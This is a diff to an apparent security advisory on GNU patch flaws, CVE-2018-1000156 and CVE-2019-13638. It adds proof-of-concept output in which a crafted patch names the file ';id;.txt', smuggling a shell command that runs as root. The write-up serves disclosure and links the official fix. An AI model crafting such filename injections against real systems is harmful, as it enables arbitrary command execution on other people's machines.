@@ -25,7 +25,7 @@ instead of piping it to ed: this will cause ed to abort on invalid
 commands instead of rejecting them and carrying on.
 
 
-The thing is, ed's behaviour is different when the script is coming
+The thing is, `ed`'s behaviour is different when the script is coming
 from a pipe (see the edoffset.script attached):
 
 ```
@@ -62,26 +62,35 @@ root@55c24e15f7e6:/data/edstyle5# cat CVE-2018-1000156-proof.txt
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-CVE-2018-1000156.patch is pretty much the same as the original PoC created
-for that issue (poc.patch among the attachments on savannah linked above).
+`CVE-2018-1000156.patch` is pretty much the same as the original PoC created
+for that issue (`poc.patch` among the attachments on savannah linked above).
 
 
 ### CVE-2019-13638 - Shell command injection while invoking ed
 
-The GNU patch utility used to 
-This is a shell command injection via the filename 
+The GNU patch utility used to invoke `ed` via the shell interpreter and the filenames
+were not sanitized correctly, making it vulnerable to shell command injection.
+This way, exploitation of CVE-2019-13638 doesn't even require `ed` to be installed.
 
+The official fix was commited the same day as for CVE-2018-1000156, but many distributions
+didn't pick it up:
+
+https://git.savannah.gnu.org/cgit/patch.git/commit/?id=3fcd042d26d70856e826a42b5f93dc4854d80bf0
+
+The proof of concept:
+
+```
 root@3ffaeb445eab:/data/edstyle4# patch --version
 GNU patch 2.7.6
 ...
 
-root@3ffaeb445eab:/data/edstyle4# patch < edstyle-exploit.patch
+root@3ffaeb445eab:/data/edstyle4# patch < CVE-2019-13638.patch
 patching file ';id;.txt'
 sh: 1: ed: not found
 uid=0(root) gid=0(root) groups=0(root)
 sh: 1: .txt.o60SfgR: not found
 patch: **** ed FAILED
-
+```
 
 ### CVE-2019-13636 - Directory traversal and file append
 
